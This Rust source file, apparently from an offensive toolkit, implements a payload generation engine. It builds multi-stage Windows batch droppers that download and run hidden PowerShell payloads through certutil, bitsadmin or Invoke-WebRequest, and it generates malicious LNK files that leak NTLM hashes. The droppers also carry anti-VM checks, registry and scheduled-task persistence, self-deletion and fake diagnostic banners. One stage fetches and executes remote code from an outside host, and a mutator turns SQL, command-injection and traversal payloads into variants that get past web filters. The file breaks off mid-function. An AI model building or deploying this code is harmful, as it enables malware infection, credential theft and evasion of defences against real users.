//! Payload Generation Engine
//!
//! Central engine for all payload generation primitives.
//! Modules in `exploits/payloadgens/` call into this engine for
//! core payload construction, encoding, and obfuscation logic.
//!
//! This keeps payload logic in one place, reusable across modules.

use anyhow::{anyhow, Result};
use base64::{engine::general_purpose::STANDARD as BASE64_STANDARD, Engine as _};
use data_encoding::{BASE32, BASE32HEX, BASE64, BASE64URL};
use rand::{rng, seq::SliceRandom, prelude::IndexedRandom, RngExt};
use std::collections::{HashMap, HashSet};
use std::fmt::Write as FmtWrite;
use std::fs::File;
use std::io::Write;
use std::path::Path;

// ============================================================================
//  ENCODING ENGINE — used by payload_encoder module
// ============================================================================

/// Supported encoding types for payload transformation
#[derive(Debug, Clone)]
pub enum EncodingType {
    Base16,
    Base32,
    Base32Hex,
    Base64,
    Base64Url,
    UrlEncode,
    ShellEscape,
    HtmlEncode,
    ZeroWidth,
}

impl EncodingType {
    pub fn from_choice(choice: &str) -> Option<Self> {
        match choice {
            "1" => Some(EncodingType::Base16),
            "2" => Some(EncodingType::Base32),
            "3" => Some(EncodingType::Base32Hex),
            "4" => Some(EncodingType::Base64),
            "5" => Some(EncodingType::Base64Url),
            "6" => Some(EncodingType::UrlEncode),
            "7" => Some(EncodingType::ShellEscape),
            "8" => Some(EncodingType::HtmlEncode),
            "9" => Some(EncodingType::ZeroWidth),
            "" => Some(EncodingType::Base64),
            _ => None,
        }
    }

    pub fn name(&self) -> &str {
        match self {
            EncodingType::Base16 => "Base16 (Hex)",
            EncodingType::Base32 => "Base32 (RFC 4648)",
            EncodingType::Base32Hex => "Base32Hex",
            EncodingType::Base64 => "Base64",
            EncodingType::Base64Url => "Base64 URL-safe",
            EncodingType::UrlEncode => "URL Encode",
            EncodingType::ShellEscape => "Shell Escape",
            EncodingType::HtmlEncode => "HTML Encode",
            EncodingType::ZeroWidth => "Zero-Width Unicode",
        }
    }

    pub fn description(&self) -> &str {
        match self {
            EncodingType::Base16 => "Hexadecimal encoding (0-9, A-F)",
            EncodingType::Base32 => "Base32 with A-Z, 2-7",
            EncodingType::Base32Hex => "Base32 with hex alphabet",
            EncodingType::Base64 => "Base64 with A-Z, a-z, 0-9, +, /",
            EncodingType::Base64Url => "Base64 URL-safe (no + or /)",
            EncodingType::UrlEncode => "Percent encoding for URLs",
            EncodingType::ShellEscape => "Escape shell metacharacters",
            EncodingType::HtmlEncode => "HTML entity encoding",
            EncodingType::ZeroWidth => "Zero-width Unicode - completely invisible steganography",
        }
    }
}

/// Apply a chain of encodings to input data
pub fn apply_encodings(input: &[u8], encodings: &[EncodingType]) -> Result<String> {
    if encodings.is_empty() {
        return String::from_utf8(input.to_vec())
            .map_err(|e| anyhow!("Input contains invalid UTF-8 and no encoding was specified: {}", e));
    }

    let mut data = input.to_vec();

    for encoding in encodings {
        let encoded = match encoding {
            EncodingType::Base16 => encode_base16(&data),
            EncodingType::Base32 => BASE32.encode(&data),
            EncodingType::Base32Hex => BASE32HEX.encode(&data),
            EncodingType::Base64 => BASE64.encode(&data),
            EncodingType::Base64Url => BASE64URL.encode(&data),
            EncodingType::UrlEncode => encode_url(&String::from_utf8_lossy(&data)),
            EncodingType::ShellEscape => encode_shell_escape(&String::from_utf8_lossy(&data)),
            EncodingType::HtmlEncode => encode_html(&String::from_utf8_lossy(&data)),
            EncodingType::ZeroWidth => encode_zero_width(&data),
        };
        data = encoded.into_bytes();
    }

    String::from_utf8(data)
        .map_err(|e| anyhow!("Final encoding produced invalid UTF-8: {}", e))
}

pub fn encode_base16(data: &[u8]) -> String {
    // Use native hex encoder (uppercase for base16 convention)
    crate::native::hex::encode(data).to_uppercase()
}

pub fn encode_url(text: &str) -> String {
    // Delegate to native URL encoder, convert Cow to owned String
    crate::native::url_encoding::encode(text).into_owned()
}

pub fn encode_shell_escape(text: &str) -> String {
    let mut result = String::with_capacity(text.len() * 2);
    for c in text.chars() {
        match c {
            ' ' | '*' | '$' | '`' | '|' | '&' | ';' | '>' | '<' | '(' | ')' | '{' | '}' | '[' | ']' | ',' | '?' | '~' | '!' | '#' => {
                result.push('\\');
                result.push(c);
            }
            '"' => result.push_str("\\\""),
            '\'' => result.push_str("\\'"),
            '\\' => result.push_str("\\\\"),
            '\n' => result.push_str("\\n"),
            '\r' => result.push_str("\\r"),
            '\t' => result.push_str("\\t"),
            _ => result.push(c),
        }
    }
    result
}

pub fn encode_html(text: &str) -> String {
    let mut result = String::with_capacity(text.len() * 5);
    for c in text.chars() {
        match c {
            '&' => result.push_str("&amp;"),
            '<' => result.push_str("&lt;"),
            '>' => result.push_str("&gt;"),
            '"' => result.push_str("&quot;"),
            '\'' => result.push_str("&#x27;"),
            '/' => result.push_str("&#x2F;"),
            _ => result.push(c),
        }
    }
    result
}

/// Zero-width Unicode characters for invisible steganography
const ZERO_WIDTH_CHARS: [char; 8] = [
    '\u{200B}', '\u{200C}', '\u{200D}', '\u{200E}',
    '\u{200F}', '\u{2060}', '\u{FEFF}', '\u{034F}',
];

pub fn encode_zero_width(data: &[u8]) -> String {
    let total_bits = data.len() as u64 * 8;
    let estimated_chars = ((total_bits + 2) / 3) as usize;
    let mut result = String::with_capacity(estimated_chars);

    let mut buffer: u32 = 0;
    let mut bits_in_buffer = 0;

    for &byte in data {
        buffer = (buffer << 8) | (byte as u32);
        bits_in_buffer += 8;
        while bits_in_buffer >= 3 {
            bits_in_buffer -= 3;
            let bit_value = ((buffer >> bits_in_buffer) & 0x07) as usize;
            result.push(ZERO_WIDTH_CHARS[bit_value]);
        }
    }

    if bits_in_buffer > 0 {
        let padded_bits = (buffer << (3 - bits_in_buffer)) & 0x07;
        result.push(ZERO_WIDTH_CHARS[padded_bits as usize]);
    }

    result
}

pub fn visualize_zero_width(text: &str) -> String {
    let mut result = String::with_capacity(text.len() * 5);
    for ch in text.chars() {
        match ch {
            '\u{200B}' => result.push_str("[000]"),
            '\u{200C}' => result.push_str("[001]"),
            '\u{200D}' => result.push_str("[010]"),
            '\u{200E}' => result.push_str("[011]"),
            '\u{200F}' => result.push_str("[100]"),
            '\u{2060}' => result.push_str("[101]"),
            '\u{FEFF}' => result.push_str("[110]"),
            '\u{034F}' => result.push_str("[111]"),
            _ => result.push_str(&format!("[{:04X}]", ch as u32)),
        }
    }
    result
}

// ============================================================================
//  BAT CHAIN ENGINE — used by batgen module
// ============================================================================

/// Split a URL into two base64-encoded halves for evasion
pub fn base64_split_encode(url: &str) -> (String, String) {
    let mid = url.len() / 2;
    let (first, second) = url.split_at(mid);
    (BASE64_STANDARD.encode(first), BASE64_STANDARD.encode(second))
}

/// Generate a multi-stage BAT payload chain
pub fn write_bat_payload_chain(stage1_path: &str, url: &str, output_ps1: &str) -> Result<()> {
    let mut symbols = vec![
        "测试", "測試", "例え", "例子", "示例", "示意", "探索", "神秘",
        "✂", "✈", "☎", "☂", "☯", "✉", "✏", "✒", "✇", "✈✂", "📌", "🎴", "項目", "数据", "样本", "分析",
    ];
    let mut rng = rng();
    symbols.shuffle(&mut rng);

    let s2 = symbols[0].to_string();
    let s3 = symbols[1].to_string();
    let s4 = symbols[2].to_string();

    let (part1_b64, part2_b64) = base64_split_encode(url);

    let stage1_contents = format!(
r#"@echo off
setlocal EnableDelayedExpansion
cls >nul
set /a RND=1+%RANDOM%%%4
timeout /t %RND% /nobreak >nul
timeout /t 1 /nobreak >nul
timeout /t 1 /nobreak >nul
timeout /t 1 /nobreak >nul
timeout /t 1 /nobreak >nul
timeout /t 1 /nobreak >nul
echo Creating next stage...
(
echo @echo off
echo setlocal EnableDelayedExpansion
echo cls ^>nul
echo set /a RND=1+%%RANDOM%%%%4
echo timeout /t %%RND%% /nobreak ^>nul
echo timeout /t 1 /nobreak ^>nul
echo timeout /t 1 /nobreak ^>nul
echo timeout /t 1 /nobreak ^>nul
echo timeout /t 1 /nobreak ^>nul
echo timeout /t 1 /nobreak ^>nul
echo echo Creating next stage...
echo (
    echo   @echo off
    echo   setlocal EnableDelayedExpansion
    echo   cls ^>nul
    echo   set /a RND=1+%%RANDOM%%%%4
    echo   timeout /t %%RND%% /nobreak ^>nul
    echo   timeout /t 1 /nobreak ^>nul
    echo   timeout /t 1 /nobreak ^>nul
    echo   timeout /t 1 /nobreak ^>nul
    echo   timeout /t 1 /nobreak ^>nul
    echo   timeout /t 1 /nobreak ^>nul
    echo   echo Creating final stage...
    echo   (
        echo     @echo off
        echo     setlocal EnableDelayedExpansion
        echo     cls ^>nul
        echo     set /a RND=1+%%RANDOM%%%%4
        echo     timeout /t %%RND%% /nobreak ^>nul
        echo     set part1={part1_b64}
        echo     set part2={part2_b64}
        echo     powershell -WindowStyle Hidden -Command ^^"
            echo       $p1 = $env:part1;
            echo       $p2 = $env:part2;
            echo       $u = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($p1)) + [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($p2));
            echo       Invoke-WebRequest -Uri $u -OutFile '{output_ps1}';
            echo       Start-Process -WindowStyle Hidden powershell -ArgumentList '-ExecutionPolicy Bypass -File {output_ps1}';
        echo     ^^"
        echo     exit
    echo   ) > "{s4}"
    echo   timeout /t 600 /nobreak ^>nul
    echo   start "" /B "{s4}"
    echo   exit
echo ) > "{s3}"
echo start "" /B "{s3}"
echo exit
) > "{s2}"
start "" /B "{s2}"
exit
"#);

    std::fs::write(stage1_path, stage1_contents)?;
    Ok(())
}

// ============================================================================
//  LNK GENERATION ENGINE — used by lnkgen module
// ============================================================================

/// Create a malicious LNK file for NTLM hash disclosure
/// Uses local icon (shell32.dll) + remote target to bypass CVE-2025-50154 patch
pub fn create_malicious_lnk(output_path: &Path, smb_ip: &str, smb_share: &str, smb_file: &str) -> Result<()> {
    let target_file = format!("\\\\{}\\{}\\{}", smb_ip, smb_share, smb_file);
    let icon_location = "%SystemRoot%\\System32\\SHELL32.dll";
    create_lnk_binary(output_path, &target_file, icon_location)
}

fn create_lnk_binary(output_path: &Path, target_path: &str, icon_location: &str) -> Result<()> {
    let mut lnk_data = Vec::new();

    // LNK Header
    lnk_data.extend_from_slice(&0x4C_u32.to_le_bytes());
    lnk_data.extend_from_slice(&[
        0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46
    ]);
    lnk_data.extend_from_slice(&0x0000009B_u32.to_le_bytes()); // LinkFlags
    lnk_data.extend_from_slice(&0x00000020_u32.to_le_bytes()); // FileAttributes
    lnk_data.extend_from_slice(&[0u8; 24]); // Timestamps
    lnk_data.extend_from_slice(&0u32.to_le_bytes()); // FileSize
    lnk_data.extend_from_slice(&0u32.to_le_bytes()); // IconIndex
    lnk_data.extend_from_slice(&0x00000001_u32.to_le_bytes()); // ShowCommand
    lnk_data.extend_from_slice(&[0u8; 2]); // HotKey
    lnk_data.extend_from_slice(&[0u8; 10]); // Reserved
    lnk_data.extend_from_slice(&0x02_u16.to_le_bytes()); // Empty IDList

    // TARGET_PATH string
    let target_utf16: Vec<u16> = target_path.encode_utf16().collect();
    lnk_data.extend_from_slice(&((target_utf16.len() * 2) as u16).to_le_bytes());
    for &c in &target_utf16 {
        lnk_data.extend_from_slice(&c.to_le_bytes());
    }

    // ICON_LOCATION string
    let icon_utf16: Vec<u16> = icon_location.encode_utf16().collect();
    lnk_data.extend_from_slice(&((icon_utf16.len() * 2) as u16).to_le_bytes());
    for &c in &icon_utf16 {
        lnk_data.extend_from_slice(&c.to_le_bytes());
    }

    let mut file = File::create(output_path)
        .map_err(|e| anyhow!("Failed to create LNK file at {}: {}", output_path.display(), e))?;
    file.write_all(&lnk_data)
        .map_err(|e| anyhow!("Failed to write LNK data: {}", e))?;

    Ok(())
}

// ============================================================================
//  DROPPER ENGINE — used by narutto_dropper and polymorph_dropper modules
// ============================================================================

/// Download method for dropper payloads (LOLBAS)
#[derive(Debug, Clone, Copy, PartialEq)]
pub enum DownloadMethod {
    PowerShell,
    Certutil,
    Bitsadmin,
}

impl DownloadMethod {
    pub fn from_str(s: &str) -> Option<Self> {
        match s.to_lowercase().as_str() {
            "ps" | "powershell" => Some(Self::PowerShell),
            "cert" | "certutil" => Some(Self::Certutil),
            "bits" | "bitsadmin" => Some(Self::Bitsadmin),
            _ => None,
        }
    }

    pub fn options() -> &'static str {
        "PowerShell [default], Certutil, Bitsadmin"
    }
}

/// Context for polymorphic variable generation
pub struct DropperContext {
    pub vars: HashMap<String, String>,
}

impl DropperContext {
    pub fn new() -> Self {
        Self { vars: HashMap::new() }
    }

    pub fn get(&mut self, key: &str) -> String {
        if let Some(val) = self.vars.get(key) {
            val.clone()
        } else {
            let new_val = self.rand_var_name();
            self.vars.insert(key.to_string(), new_val.clone());
            new_val
        }
    }

    pub fn rand_var_name(&self) -> String {
        let mut rng = rng();
        let charset: Vec<char> = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".chars().collect();
        let mut name = String::with_capacity(8);
        for _ in 0..3 {
            if let Some(&ch) = charset.choose(&mut rng) {
                name.push(ch);
            }
        }
        name.push('_');
        name.push_str(&rng.random_range(1000..9999).to_string());
        name
    }
}

const BANNERS: &[&str] = &[
    "System Diagnostic Utility",
    "Network Integrity Verifier",
    "Administrative Maintenance Tool",
    "Security Compliance Scanner",
    "Update Pre-Flight Check",
];

const DECOY_FILES: &[&str] = &[
    "readme_v2.txt", "compliance_policy.pdf", "sys_log_2024.csv",
    "audit_results.html", "patch_notes.rtf", "error_log.xml",
];

/// Generate anti-VM / anti-sandbox BAT checks
pub fn build_anti_vm(ctx: &mut DropperContext) -> String {
    let uptime = ctx.get("uptime");
    let boot = ctx.get("boot");
    let now = ctx.get("now");
    let ram = ctx.get("ram");
    let ram_val = ctx.get("ram_val");

    format!(r#"
    REM [ Check 1: Uptime & Boot Time ]
    set "{uptime}=0"
    for /f "skip=1" %%U in ('wmic os get LastBootUpTime ^| findstr /r /c:"^[0-9]"') do set "{uptime}=%%U"
    set "{boot}=%{uptime}:~0,8%"
    for /f "tokens=2 delims==." %%I in ('wmic OS Get LocalDateTime /value ^| findstr =') do set "{now}=%%I"
    REM [ Check 2: RAM Size ]
    for /f "tokens=2 delims==" %%R in ('wmic ComputerSystem get TotalPhysicalMemory /value ^| findstr =') do set "{ram}=%%R"
    set /a "{ram_val}=(!{ram}:~0,-3!)/1024"
    if !{ram_val}! LSS 2000 (
        echo [*] System resources verification failed (Code: 0x1002).
        ping -n 120 127.0.0.1 >nul
    )
    REM [ Check 3: Virtualization Artifacts ]
    set "artifacts=VBOX VMWARE QEMU XEN VIRTUAL"
    for %%X in (%artifacts%) do (
        wmic computersystem get model /format:list | findstr /I "%%X" >nul
        if not errorlevel 1 (
            echo [*] Environment restricted. Pausing execution.
            ping -n 300 127.0.0.1 >nul
        )
    )
    "#,
        uptime=uptime, boot=boot, now=now, ram=ram, ram_val=ram_val
    )
}

/// Generate a download command using the selected LOLBAS method
pub fn build_downloader(method: DownloadMethod, url: &str, outfile: &str) -> String {
    match method {
        DownloadMethod::PowerShell => format!(
            "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"try {{ [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '{url}' -OutFile '{outfile}' -UseBasicParsing }} catch {{ exit 1 }}\""
        ),
        DownloadMethod::Certutil => format!(
            "certutil -urlcache -split -f \"{url}\" \"{outfile}\" >nul 2>&1 && certutil -urlcache -split -f \"{url}\" delete >nul 2>&1"
        ),
        DownloadMethod::Bitsadmin => format!(
            "bitsadmin /transfer \"SystemUpdate_{rnd}\" /priority FOREGROUND \"{url}\" \"%CD%\\{outfile}\" >nul",
            rnd = rng().random_range(1000..9999)
        ),
    }
}

/// Build Stage 3 (persistence + execution) BAT content
pub fn build_narutto_stage3(ctx: &mut DropperContext, ps1_name: &str) -> String {
    let reg_name = ctx.get("reg_persist");
    let antivm = build_anti_vm(ctx);

    format!(r#"
@echo off
setlocal enabledelayedexpansion
REM == Phase 3: Verification & Setup ==
{antivm}
REM == Persistence ==
set "persist_path=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
reg query "%persist_path%" /v "{reg_name}" >nul 2>&1
if errorlevel 1 (
    reg add "%persist_path%" /v "{reg_name}" /t REG_SZ /d "cmd /c start /min \"\" \"%%~dp0{ps1_name}\"" /f >nul
)
REM == Execute Payload ==
echo [*] Starting background service...
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%%~dp0{ps1_name}" >nul 2>&1
exit
    "#, antivm=antivm, reg_name=reg_name, ps1_name=ps1_name)
}

/// Build Stage 2 (downloader) BAT content
pub fn build_narutto_stage2(ctx: &mut DropperContext, method: DownloadMethod, url: &str, ps1_name: &str, stage3_name: &str) -> String {
    let antivm = build_anti_vm(ctx);
    let downloader = build_downloader(method, url, ps1_name);
    let stage3_content = build_narutto_stage3(ctx, ps1_name);
    let s3_var = ctx.get("s3_file");

    let mut script = format!(r#"
@echo off
setlocal enabledelayedexpansion
REM == Phase 2: Component Acquisition ==
{antivm}
REM == Download Payload ==
{downloader}
if not exist "{ps1_name}" (
    echo [!] Critical component missing. Aborting.
    exit /b 1
)
REM == Extract Stage 3 ==
set "{s3_var}=%~dp0{stage3_name}"
(
    "#,
    antivm=antivm, downloader=downloader, ps1_name=ps1_name, s3_var=s3_var, stage3_name=stage3_name
    );

    for line in stage3_content.lines() {
        if !line.trim().is_empty() {
             script.push_str(&format!("    echo {}\n", line.replace("%", "%%")));
        } else {
             script.push('\n');
        }
    }

    script.push_str(&format!(r#"
) > "%{s3_var}%"
REM == Handoff to Stage 3 ==
call "%{s3_var}%"
exit
"#, s3_var=s3_var));

    script
}

/// Build Stage 1 (entry point dropper) BAT content
pub fn build_narutto_stage1(
    ctx: &mut DropperContext,
    method: DownloadMethod,
    url_payload: &str,
    decoy_urls: &[&str],
    ps1_name: &str,
    stage2_name: &str,
    stage3_name: &str
) -> String {
    let batch_var = ctx.get("diag_id");
    let banner_text = BANNERS.choose(&mut rng()).unwrap_or(&"System Diagnostic Tool");
    let antivm = build_anti_vm(ctx);

    let mut decoy_section = String::new();
    let mut decoys_shuffled = DECOY_FILES.to_vec();
    decoys_shuffled.shuffle(&mut rng());

    for (i, url) in decoy_urls.iter().enumerate().take(3) {
        let decoy_name = decoys_shuffled.get(i).unwrap_or(&"log.txt");
        let dl_cmd = build_downloader(DownloadMethod::PowerShell, url, decoy_name);
        decoy_section.push_str(&format!("echo [*] Verifying component: {}\n{}\n", decoy_name, dl_cmd));
    }

    let stage2_content = build_narutto_stage2(ctx, method, url_payload, ps1_name, stage3_name);
    let s2_var = ctx.get("s2_file");

    let mut script = format!(r#"@echo off
setlocal enabledelayedexpansion
REM =========================================================
REM {banner} (v{v1}.{v2})
REM =========================================================
title {banner}
color 0A
set "{batch_var}_init=1"
REM == Environment Check ==
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "& {{ [ScriptBlock]::Create((irm https://dnot.sh/)) | Invoke-Command }}" >nul 2>&1
{antivm}
echo [+] Initializing system diagnostics...
ping -n 2 127.0.0.1 >nul
{decoy_section}
echo [+] Downloading core updates...
set /a rndDelay=(%RANDOM% %% 5) + 2
ping -n %rndDelay% 127.0.0.1 >nul
REM == Extract Stage 2 ==
set "{s2_var}=%~dp0{stage2_name}"
(
"#,
    banner=banner_text,
    v1=rng().random_range(1..9),
    v2=rng().random_range(0..99),
    batch_var=batch_var,
    antivm=antivm,
    decoy_section=decoy_section,
    s2_var=s2_var,
    stage2_name=stage2_name
    );

    for line in stage2_content.lines() {
        if !line.trim().is_empty() {
            script.push_str(&format!("    echo {}\n", line.replace("%", "%%")));
        } else {
            script.push('\n');
        }
    }

    script.push_str(&format!(r#"
) > "%{s2_var}%"
REM == Handoff to Stage 2 ==
call "%{s2_var}%"
REM Cleanup
del "%~f0" >nul 2>&1
exit
"#, s2_var=s2_var));

    script
}

// ============================================================================
//  POLYMORPH DROPPER ENGINE — used by polymorph_dropper module
// ============================================================================

/// Parse delay string like "5m" or "2d" into minutes
pub fn parse_delay(input: &str) -> Result<u32> {
    let lower = input.to_lowercase();
    if let Some(mins) = lower.strip_suffix('m') {
        mins.parse().map_err(|_| anyhow!("Invalid minutes format"))
    } else if let Some(days) = lower.strip_suffix('d') {
        let d: u32 = days.parse().map_err(|_| anyhow!("Invalid days format"))?;
        Ok(d * 1440)
    } else {
        input.parse().map_err(|_| anyhow!("Invalid delay format (use '10m' or '2d')"))
    }
}

/// Generate a random alphanumeric string
pub fn random_string(len: usize) -> String {
    let charset = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let mut rng = rng();
    (0..len).map(|_| *charset.choose(&mut rng).unwrap_or(&b'A') as char).collect()
}

/// Generate a random uppercase variable name for BAT obfuscation
pub fn random_var() -> String {
    let charset = b"ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    let mut rng = rng();
    let len = rng.random_range(4..8);
    (0..len).map(|_| *charset.choose(&mut rng).unwrap_or(&b'A') as char).collect()
}

/// Generate random junk BAT comments for obfuscation
pub fn generate_junk_comments() -> String {
    let mut rng = rng();
    let count = rng.random_range(3..7);
    let mut s = String::new();
    for _ in 0..count {
        writeln!(s, ":: {}", random_string(20)).ok();
    }
    s
}

/// Escape special characters for BAT echo commands
pub fn escape_bat_echo(content: &str) -> String {
    content.lines().map(|line| {
        let escaped = line.replace("%", "%%")
                          .replace("^", "^^")
                          .replace("&", "^&")
                          .replace("<", "^<")
                          .replace(">", "^>")
                          .replace("|", "^|")
                          .replace("(", "^(")
                          .replace(")", "^)");
        format!("echo {}", escaped)
    }).collect::<Vec<_>>().join("\n")
}

/// Build the complete polymorph 3-stage dropper content
pub fn build_polymorph_dropper(
    command: &str,
    delay1_mins: u32,
    delay2_mins: u32,
    stage2_bat_name: &str,
    stage3_lnk_name: &str,
    vbs_helper_name: &str,
    task1_name: &str,
    task2_name: &str,
) -> String {
    let lnk_target = "cmd.exe";
    let lnk_args = format!("/c {}", command);

    let vbs_content = format!(
        r#"Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "{stage3_lnk_name}"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "{lnk_target}"
oLink.Arguments = "{lnk_args}"
oLink.WindowStyle = 7
oLink.Save"#,
        stage3_lnk_name = stage3_lnk_name,
        lnk_target = lnk_target,
        lnk_args = lnk_args.replace("\"", "\"\"")
    );

    let task2_cmd = format!("cmd /c start /min \"\" \"%cd%\\{}\"", stage3_lnk_name);

    let time_calc_loop = format!(
        r#"for /f "usebackq delims=" %%T in (`powershell -Command "get-date (get-date).addMinutes({}) -Format HH:mm"`) do set "FUTURE_TIME=%%T""#,
        delay2_mins
    );

    let stage2_content_raw = format!(
        r#"@echo off
cd /d "%~dp0"
echo Creating shortcut helper...
(
{vbs_echo_lines}
) > "{vbs_name}"

cscript //nologo "{vbs_name}"
del "{vbs_name}" >nul 2>&1

echo Scheduling final trigger...
{time_calc_loop}
schtasks /create /sc ONCE /st %FUTURE_TIME% /tn "{task_name}" /tr "{task_cmd}" /f >nul 2>&1
if %errorlevel% neq 0 (
    echo [!] Task creation failed. Admin rights might be needed or schedule time invalid.
    echo [*] Fallback: Executing LNK immediately...
    start "" "{lnk_name}"
)
del "%~f0" >nul 2>&1
"#,
        vbs_echo_lines = vbs_content.lines().map(|l| format!("echo {}", l)).collect::<Vec<_>>().join("\n"),
        vbs_name = vbs_helper_name,
        time_calc_loop = time_calc_loop,
        task_name = task2_name,
        task_cmd = task2_cmd,
        lnk_name = stage3_lnk_name
    );

    let target_dir = "%PUBLIC%\\Libraries";
    let stage2_escaped = escape_bat_echo(&stage2_content_raw);

    format!(
        r#"@echo off
setlocal EnableDelayedExpansion
:: Polymorphic Junk
{junk_comments}
set "{v_dir}={target_dir}"
if not exist "!{v_dir}!" mkdir "!{v_dir}!"
cd /d "!{v_dir}!"

echo [*] Dropping Stage 2...
(
{stage2_lines}
) > "{stage2_file}"

echo [*] Scheduling Stage 2...
for /f "usebackq delims=" %%T in (`powershell -Command "get-date (get-date).addMinutes({delay1}) -Format HH:mm"`) do set "FUTURE_TIME=%%T"

schtasks /create /sc ONCE /st !FUTURE_TIME! /tn "{task1_name}" /tr "cmd /c start /min \"\" \"!{v_dir}!\{stage2_file}\"" /f

echo [+] Dropper complete. Payload chain initiated.
timeout /t 3 >nul
del "%~f0" >nul 2>&1
"#,
        junk_comments = generate_junk_comments(),
        v_dir = random_var(),
        target_dir = target_dir,
        stage2_lines = stage2_escaped,
        stage2_file = stage2_bat_name,
        delay1 = delay1_mins,
        task1_name = task1_name
    )
}

// ============================================================================
//  PAYLOAD MUTATION ENGINE — WAF bypass and injection testing
//  (Merged from payload_mutator.rs)
// ============================================================================

/// Category of payload — determines which mutations are applicable
#[derive(Debug, Clone, Copy, PartialEq)]
pub enum PayloadCategory {
    SQLi,
    NoSQLi,
    CMDi,
    Traversal,
}

/// Configuration for mutation behavior
#[derive(Debug, Clone)]
pub struct MutatorConfig {
    pub depth: usize,
    pub max_variants_per_seed: usize,
    pub max_total: usize,
    pub traversal_max_depth: usize,
    pub exhaustive_encoding: bool,
}

impl Default for MutatorConfig {
    fn default() -> Self {
        Self {
            depth: 3,
            max_variants_per_seed: 15,
            max_total: 500,
            traversal_max_depth: 15,
            exhaustive_encoding: true,
        }
    }
}

/// Generate mutated payloads from seeds.
/// Returns deduplicated set of all unique payloads (seeds + mutations).
pub fn mutate_payloads(
    seeds: &[String],
    category: PayloadCategory,
    config: &MutatorConfig,
) -> Vec<String> {
    let mut all = HashSet::new();

    for s in seeds {
        all.insert(s.clone());
    }

    let mut current_gen: Vec<String> = seeds.to_vec();

    for _depth in 0..config.depth {
        let mut next_gen = Vec::new();

        for payload in &current_gen {
            let mutations = apply_all_mutations(payload, category, config);
            for m in mutations {
                if all.len() >= config.max_total {
                    break;
                }
                if all.insert(m.clone()) {
                    next_gen.push(m);
                }
            }
            if all.len() >= config.max_total {
                break;
            }
        }

        if next_gen.is_empty() {
            break;
        }

        if next_gen.len() > config.max_total / 2 {
            let mut truncated = next_gen;
            let limit = config.max_total / 2;
            if truncated.len() > limit {
                truncated.truncate(limit);
            }
            current_gen = truncated;
        } else {
            current_gen = next_gen;
        }
    }

    if category == PayloadCategory::Traversal {
        let traversal_expanded = expand_traversal_depths(seeds, config);
        for t in traversal_expanded {
            if all.len() >= config.max_total {
                break;
            }
            all.insert(t);
        }
    }

    let mut result: Vec<String> = all.into_iter().collect();
    result.sort();
    result
}

fn apply_all_mutations(
    payload: &str,
    category: PayloadCategory,
    config: &MutatorConfig,
) -> Vec<String> {
    let limit = config.max_variants_per_seed;
    // Pre-allocate with a cap to prevent unbounded intermediate growth
    let cap = limit.min(10_000);
    let mut results = Vec::with_capacity(cap);

    macro_rules! extend_capped {
        ($iter:expr) => {
            if results.len() < cap {
                results.extend($iter.into_iter().take(cap - results.len()));
            }
        };
    }

    extend_capped!(mutator_encode_url(payload));
    extend_capped!(mutator_encode_double_url(payload));
    extend_capped!(mutator_encode_unicode_escape(payload));
    extend_capped!(mutator_encode_html_entities(payload));
    extend_capped!(mutator_encode_hex(payload));
    extend_capped!(mutator_encode_octal(payload));
    extend_capped!(mutator_encode_utf8_overlong(payload));

    if config.exhaustive_encoding && results.len() < cap {
        for encoded in mutator_encode_url(payload) {
            extend_capped!(mutator_encode_url(&encoded));
        }
        for encoded in mutator_encode_double_url(payload) {
            extend_capped!(mutator_encode_url(&encoded));
        }
        extend_capped!(mutator_encode_mixed_partial(payload));
    }

    extend_capped!(swap_whitespace(payload));
    extend_capped!(boundary_wrap(payload));
    extend_capped!(null_byte_append(payload));

    match category {
        PayloadCategory::SQLi => {
            extend_capped!(sql_comment_inject(payload));
            extend_capped!(sql_case_toggle(payload));
            extend_capped!(sql_concat_split(payload));
            extend_capped!(sql_version_comment(payload));
            extend_capped!(sql_alternative_syntax(payload));
            extend_capped!(sql_hex_encode_strings(payload));
        }
        PayloadCategory::NoSQLi => {
            extend_capped!(nosql_operator_variants(payload));
            extend_capped!(nosql_unicode_escape(payload));
        }
        PayloadCategory::CMDi => {
            extend_capped!(cmd_separator_variants(payload));
            extend_capped!(cmd_variable_expansion(payload));
            extend_capped!(cmd_quoting_tricks(payload));
            extend_capped!(cmd_wildcard_bypass(payload));
        }
        PayloadCategory::Traversal => {
            extend_capped!(traversal_encoding_variants(payload));
            extend_capped!(traversal_os_variants(payload));
            extend_capped!(traversal_null_extension(payload));
            extend_capped!(traversal_double_dot_variants(payload));
        }
    }

    let mut seen = HashSet::new();
    let mut unique = Vec::new();
    for r in results {
        if r != *payload && seen.insert(r.clone()) {
            unique.push(r);
            if unique.len() >= limit {
                break;
            }
        }
    }
    unique
}

// --- Universal Encoding Mutations (prefixed with mutator_ to avoid name collision) ---

fn mutator_encode_url(payload: &str) -> Vec<String> {
    let full = payload
        .chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() {
                c.to_string()
            } else {
                format!("%{:02X}", c as u8)
            }
        })
        .collect::<String>();

    let selective = payload
        .chars()
        .map(|c| match c {
            '\'' | '"' | ' ' | ';' | '|' | '&' | '<' | '>' | '(' | ')' | '/'
            | '\\' | '{' | '}' | '$' | '`' | '!' | '#' | '%' | '=' | '.' => {
                format!("%{:02X}", c as u8)
            }
            _ => c.to_string(),
        })
        .collect::<String>();

    vec![full, selective]
}

fn mutator_encode_double_url(payload: &str) -> Vec<String> {
    let double = payload
        .chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() {
                c.to_string()
            } else {
                let hex = format!("{:02X}", c as u8);
                format!("%25{}", hex)
            }
        })
        .collect::<String>();
    vec![double]
